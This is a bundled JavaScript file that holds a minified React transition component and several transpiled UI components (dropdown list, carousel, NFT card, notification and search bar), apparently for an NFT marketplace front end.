function S(t=""){return t.split(/\s+/).filter(n=>n.length>1)}let I=createContext(null);I.displayName="TransitionContext";var Se=(r=>(r.Visible="visible",r.Hidden="hidden",r))(Se||{});function ye(){let t=useContext(I);if(t===null)throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");return t}function xe(){let t=useContext(M);if(t===null)throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");return t}let M=createContext(null);M.displayName="NestingContext";function U(t){return "children"in t?U(t.children):t.current.filter(({el:n})=>n.current!==null).filter(({state:n})=>n==="visible").length>0}function se(t,n){let r=s$5(t),s=useRef([]),R=f(),D=p$1(),p=o$6((i,e=v$1.Hidden)=>{let a=s.current.findIndex(({el:o})=>o===i);a!==-1&&(u$5(e,{[v$1.Unmount](){s.current.splice(a,1);},[v$1.Hidden](){s.current[a].state="hidden";}}),D.microTask(()=>{var o;!U(s)&&R.current&&((o=r.current)==null||o.call(r));}));}),x=o$6(i=>{let e=s.current.find(({el:a})=>a===i);return e?e.state!=="visible"&&(e.state="visible"):s.current.push({el:i,state:"visible"}),()=>p(i,v$1.Unmount)}),h=useRef([]),v=useRef(Promise.resolve()),u=useRef({enter:[],leave:[],idle:[]}),g=o$6((i,e,a)=>{h.current.splice(0),n&&(n.chains.current[e]=n.chains.current[e].filter(([o])=>o!==i)),n==null||n.chains.current[e].push([i,new Promise(o=>{h.current.push(o);})]),n==null||n.chains.current[e].push([i,new Promise(o=>{Promise.all(u.current[e].map(([f,N])=>N)).then(()=>o());})]),e==="enter"?v.current=v.current.then(()=>n==null?void 0:n.wait.current).then(()=>a(e)):a(e);}),d=o$6((i,e,a)=>{Promise.all(u.current[e].splice(0).map(([o,f])=>f)).then(()=>{var o;(o=h.current.shift())==null||o();}).then(()=>a(e));});return useMemo(()=>({children:s,register:x,unregister:p,onStart:g,onStop:d,wait:v,chains:u}),[x,p,s,g,d,u,v])}function Ne(){}let Pe=["beforeEnter","afterEnter","beforeLeave","afterLeave"];function ae(t){var r;let n={};for(let s of Pe)n[s]=(r=t[s])!=null?r:Ne;return n}function Re(t){let n=useRef(ae(t));return useEffect(()=>{n.current=ae(t);},[t]),n}let De="div",le=O.RenderStrategy;function He(t$1,n){var Q,Y;let{beforeEnter:r,afterEnter:s,beforeLeave:R,afterLeave:D$1,enter:p,enterFrom:x,enterTo:h,entered:v,leave:u,leaveFrom:g,leaveTo:d$1,...i}=t$1,e=useRef(null),a=y(e,n),o=(Q=i.unmount)==null||Q?v$1.Unmount:v$1.Hidden,{show:f,appear:N,initial:T}=ye(),[l,j]=useState(f?"visible":"hidden"),z=xe(),{register:L,unregister:O}=z;useEffect(()=>L(e),[L,e]),useEffect(()=>{if(o===v$1.Hidden&&e.current){if(f&&l!=="visible"){j("visible");return}return u$5(l,{["hidden"]:()=>O(e),["visible"]:()=>L(e)})}},[l,e,L,O,f,o]);let k=s$5({base:S(i.className),enter:S(p),enterFrom:S(x),enterTo:S(h),entered:S(v),leave:S(u),leaveFrom:S(g),leaveTo:S(d$1)}),V=Re({beforeEnter:r,afterEnter:s,beforeLeave:R,afterLeave:D$1}),G=l$2();useEffect(()=>{if(G&&l==="visible"&&e.current===null)throw new Error("Did you forget to passthrough the `ref` to the actual DOM node?")},[e,l,G]);let Te=T&&!N,K=N&&f&&T,de=(()=>!G||Te?"idle":f?"enter":"leave")(),H=c(0),fe=o$6(C=>u$5(C,{enter:()=>{H.addFlag(d.Opening),V.current.beforeEnter();},leave:()=>{H.addFlag(d.Closing),V.current.beforeLeave();},idle:()=>{}})),me=o$6(C=>u$5(C,{enter:()=>{H.removeFlag(d.Opening),V.current.afterEnter();},leave:()=>{H.removeFlag(d.Closing),V.current.afterLeave();},idle:()=>{}})),w=se(()=>{j("hidden"),O(e);},z),B=useRef(false);D({immediate:K,container:e,classes:k,direction:de,onStart:s$5(C=>{B.current=true,w.onStart(e,C,fe);}),onStop:s$5(C=>{B.current=false,w.onStop(e,C,me),C==="leave"&&!U(w)&&(j("hidden"),O(e));})});let P=i,ce={ref:a};return K?P={...P,className:t(i.className,...k.current.enter,...k.current.enterFrom)}:B.current&&(P.className=t(i.className,(Y=e.current)==null?void 0:Y.className),P.className===""&&delete P.className),React__default.createElement(M.Provider,{value:w},React__default.createElement(s$1,{value:u$5(l,{["visible"]:d.Open,["hidden"]:d.Closed})|H.flags},C({ourProps:ce,theirProps:P,defaultTag:De,features:le,visible:l==="visible",name:"Transition.Child"})))}function Fe(t,n){let{show:r,appear:s=false,unmount:R=true,...D}=t,p=useRef(null),x=y(p,n);l$2();let h=u$1();if(r===void 0&&h!==null&&(r=(h&d.Open)===d.Open),![true,false].includes(r))throw new Error("A <Transition /> is used but it is missing a `show={true | false}` prop.");let[v,u]=useState(r?"visible":"hidden"),g=se(()=>{u("hidden");}),[d$1,i]=useState(true),e=useRef([r]);l$3(()=>{d$1!==false&&e.current[e.current.length-1]!==r&&(e.current.push(r),i(false));},[e,r]);let a=useMemo(()=>({show:r,appear:s,initial:d$1}),[r,s,d$1]);useEffect(()=>{if(r)u("visible");else if(!U(g))u("hidden");else {let T=p.current;if(!T)return;let l=T.getBoundingClientRect();l.x===0&&l.y===0&&l.width===0&&l.height===0&&u("hidden");}},[r,g]);let o={unmount:R},f=o$6(()=>{var T;d$1&&i(false),(T=t.beforeEnter)==null||T.call(t);}),N=o$6(()=>{var T;d$1&&i(false),(T=t.beforeLeave)==null||T.call(t);});return React__default.createElement(M.Provider,{value:g},React__default.createElement(I.Provider,{value:a},C({ourProps:{...o,as:Fragment,children:React__default.createElement(ue,{ref:x,...o,...D,beforeEnter:f,beforeLeave:N})},theirProps:{},defaultTag:Fragment,features:le,visible:v==="visible",name:"Transition"})))}function _e(t,n){let r=useContext(I)!==null,s=u$1()!==null;return React__default.createElement(React__default.Fragment,null,!r&&s?React__default.createElement(q,{ref:n,...t}):React__default.createElement(ue,{ref:n,...t}))}let q=U$1(Fe),ue=U$1(He),Le=U$1(_e),qe=Object.assign(q,{Child:Le,Root:q});

var _excluded$2 = ["label", "items"];
var List = function List(_ref) {
  var label = _ref.label,
    items = _ref.items,
    props = _objectWithoutProperties(_ref, _excluded$2);
  var _useState = useState(items[0]),
    _useState2 = _slicedToArray(_useState, 2),
    selected = _useState2[0],
    setSelected = _useState2[1];
  return /*#__PURE__*/React__default.createElement("div", props, label ? /*#__PURE__*/React__default.createElement("span", {
    className: "flex my-3 text-sm text-trout/[0.5]"
  }, label) : null, /*#__PURE__*/React__default.createElement(It, {
    value: selected,
    onChange: setSelected
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "relative mt-1"
  }, /*#__PURE__*/React__default.createElement(It.Button, {
    className: "relative w-full py-2 pl-3 pr-10 text-left bg-white rounded-lg shadow-md cursor-default focus:outline-none focus-visible:ring-2 focus-visible:ring-opacity-75 focus-visible:ring-white focus-visible:ring-offset-orange-300 focus-visible:ring-offset-2 focus-visible:border-indigo-500 sm:text-sm"
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "block truncate"
  }, selected.name), /*#__PURE__*/React__default.createElement("span", {
    className: "absolute inset-y-0 right-0 flex items-center pr-2 pointer-events-none"
  }, /*#__PURE__*/React__default.createElement(ForwardRef$3, {
    className: "w-5 h-5 text-orange",
    "aria-hidden": "true"
  }))), /*#__PURE__*/React__default.createElement(qe, {
    as: Fragment,
    leave: "transition ease-in duration-100",
    leaveFrom: "opacity-100",
    leaveTo: "opacity-0"
  }, /*#__PURE__*/React__default.createElement(It.Options, {
    className: "absolute w-full py-1 mt-1 overflow-auto text-base bg-white rounded-md shadow-lg max-h-60 ring-1 ring-black ring-opacity-5 focus:outline-none sm:text-sm"
  }, items.map(function (item, itemIdx) {
    return /*#__PURE__*/React__default.createElement(It.Option, {
      key: itemIdx,
      className: function className(_ref2) {
        var active = _ref2.active;
        return "cursor-default select-none relative py-2 pl-10 pr-4 ".concat(active ? 'text-amber-900 bg-orange/[0.08]' : 'text-gray-900');
      },
      value: item
    }, function (_ref3) {
      var selected = _ref3.selected;
      return /*#__PURE__*/React__default.createElement(React__default.Fragment, null, /*#__PURE__*/React__default.createElement("span", {
        className: "block truncate ".concat(selected ? 'font-medium' : 'font-normal')
      }, item.name), selected ? /*#__PURE__*/React__default.createElement("span", {
        className: "absolute inset-y-0 left-0 flex items-center pl-3 text-amber-600"
      }, /*#__PURE__*/React__default.createElement(ForwardRef$4, {
        className: "w-5 h-5",
        "aria-hidden": "true"
      })) : null);
    });
  }))))));
};

var _excluded$1 = ["type", "titleImg", "title", "moreBtn", "items"];
var NavigationSwiper = function NavigationSwiper(_ref) {
  var type = _ref.type,
    titleImg = _ref.titleImg,
    title = _ref.title,
    moreBtn = _ref.moreBtn,
    items = _ref.items,
    props = _objectWithoutProperties(_ref, _excluded$1);
  var navigationPrevRef = useRef(null);
  var navigationNextRef = useRef(null);
  return /*#__PURE__*/React__default.createElement("div", {
    className: "flex flex-col mb-14"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex md:flex-row flex-col gap-y-3 items-center justify-between mb-8"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center"
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: titleImg,
    alt: "hot",
    width: 24,
    height: 24
  }), /*#__PURE__*/React__default.createElement("span", {
    className: "ml-2 text-lg font-medium text-trout"
  }, title)), /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center"
  }, /*#__PURE__*/React__default.createElement("div", {
    ref: navigationPrevRef
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center justify-center w-12 h-12 rounded-full cursor-pointer bg-gallery"
  }, /*#__PURE__*/React__default.createElement(ForwardRef$2, {
    className: "w-5 h-5 text-pale-sky",
    "aria-hidden": "true"
  }))), /*#__PURE__*/React__default.createElement("div", {
    ref: navigationNextRef
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center justify-center w-12 h-12 ml-4 rounded-full cursor-pointer bg-gallery"
  }, /*#__PURE__*/React__default.createElement(ForwardRef$1, {
    className: "w-5 h-5 text-pale-sky",
    "aria-hidden": "true"
  }))), /*#__PURE__*/React__default.createElement(Button, {
    className: "ml-6 text-lg text-orange"
  }, moreBtn))), /*#__PURE__*/React__default.createElement(Swiper, {
    slidesPerView: 'auto',
    spaceBetween: 24,
    modules: [Navigation],
    navigation: {
      prevEl: navigationPrevRef.current,
      nextEl: navigationNextRef.current
    },
    onBeforeInit: function onBeforeInit(swiper) {
      swiper.params.navigation.prevEl = navigationPrevRef.current;
      swiper.params.navigation.nextEl = navigationNextRef.current;
    },
    className: props.swiperClassName
  }, items === null || items === void 0 ? void 0 : items.map(function (item, idx) {
    return /*#__PURE__*/React__default.createElement(SwiperSlide, {
      key: idx,
      className: "md:w-1/4"
    }, type == 'creator' ? /*#__PURE__*/React__default.createElement(CreatorCard, {
      item: item,
      id: idx,
      className: "w-full h-full rounded-[16px] p-3 bg-white border-solid border border-vermilion/[0.16]"
    }) : /*#__PURE__*/React__default.createElement(NftCard, {
      item: item,
      id: idx,
      className: "w-full h-full rounded-[10px] bg-athens-gray relative"
    }));
  })));
};

var _excluded = ["item", "id", "btnBuy"];
var NftCard1 = function NftCard1(_ref) {
  var item = _ref.item,
    id = _ref.id,
    btnBuy = _ref.btnBuy,
    props = _objectWithoutProperties(_ref, _excluded);
  return /*#__PURE__*/React__default.createElement("div", props, /*#__PURE__*/React__default.createElement("img", {
    className: "custom-image",
    src: item.image,
    alt: "image-".concat(id),
    layout: "fill",
    style: {
      objectFit: 'cover'
    }
    // className='rounded-[10px]'
  }), btnBuy ? /*#__PURE__*/React__default.createElement("div", {
    className: "absolute flex left-4 bottom-32"
  }, /*#__PURE__*/React__default.createElement(Button, {
    className: "py-1 text-lg bg-white text-orange px-11 rounded-3xl"
  }, "Buy")) : null, item.like ? /*#__PURE__*/React__default.createElement("div", {
    className: "absolute flex items-center right-4 bottom-28"
  }, /*#__PURE__*/React__default.createElement("div", {
    className: "flex items-center justify-center w-6 h-6 rounded-full bg-silver mr-1.5"
  }, /*#__PURE__*/React__default.createElement(Icon, {
    type: 'heart'
  })), /*#__PURE__*/React__default.createElement("span", {
    className: "text-sm text-rolling-stone"
  }, Intl.NumberFormat({
    maximumSignificantDigits: 3
  }).format(item.like))) : null);
};

var Notification = function Notification(_ref) {
  var avatar = _ref.avatar,
    time = _ref.time,
    children = _ref.children;
  return /*#__PURE__*/React__default.createElement("div", {
    className: "p-2.5 bg-white shadow-[0_6px_48px_-6px_rgba(212,219,228,1)] text-sm min-w-[620px] flex items-center rounded-full"
  }, /*#__PURE__*/React__default.createElement(Image, {
    src: "/assets/avatars/".concat(avatar),
    width: 42,
    height: 42
  }), /*#__PURE__*/React__default.createElement("div", {
    className: "ml-3 "
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "ml-3 text-black/[.8]"
  }, children)), /*#__PURE__*/React__default.createElement("div", {
    className: "flex justify-end flex-1 pr-4"
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "ml-3 text-black/[.32]"
  }, time)));
};

var Search = function Search(_ref) {
  var mode = _ref.mode;
  return /*#__PURE__*/React__default.createElement("div", {
    className: "relative text-".concat(mode)
  }, /*#__PURE__*/React__default.createElement("span", {
    className: "absolute inset-y-0 left-0 flex items-center pl-4"
  }, /*#__PURE__*/React__default.createElement("button", {
    className: "p-1 focus:outline-none focus:shadow-outline text-orange text-opacity-40"
  }, /*#__PURE__*/React__default.createElement("svg", {
    width: "18",
    height: "18",
    viewBox: "0 0 18 18",
    fill: "none",
    xmlns: "http://www.w3.org/2000/svg"
  }, /*#__PURE__*/React__default.createElement("path", {
    d: "M12.4232 12.4278C13.5827 11.2694 14.3 9.66847 14.3 7.9C14.3 4.36538 11.4346 1.5 7.9 1.5C4.36538 1.5 1.5 4.36538 1.5 7.9C1.5 11.4346 4.36538 14.3 7.9 14.3C9.66616 14.3 11.2652 13.5846 12.4232 12.4278ZM12.4232 12.4278L16.4333 16.4379",
    stroke: "currentColor",
    strokeWidth: "1.06667",
    strokeLinecap: "square"
  })))), /*#__PURE__*/React__default.createElement("div", {
    className: "w-72"
  }, /*#__PURE__*/React__default.createElement("input", {
    type: "search",
    name: "q",
    className: "w-full py-3 px-12 text-sm bg-transparent border rounded-md border-orange border-opacity-40 focus:outline-none focus:text-gray-900",
    placeholder: "Search Companies, Products, etc",
    autoComplete: "off"
  })));
};

var index = {
  Button: Button,
  CategoryMenu: CategoryMenu,
  CreatorCard: CreatorCard,
  EffectCardSwiper: EffectCardSwiper,
  Footer: Footer,
  HowItWorksTabs: HowItWorksTab,
  Icon: Icon,
  List: List,
  NavigationSwiper: NavigationSwiper,
  NftCard: NftCard,
  NftCard1: NftCard1,
  Notification: Notification,
  Price: Price,
  Search: Search
};

export { index as default };
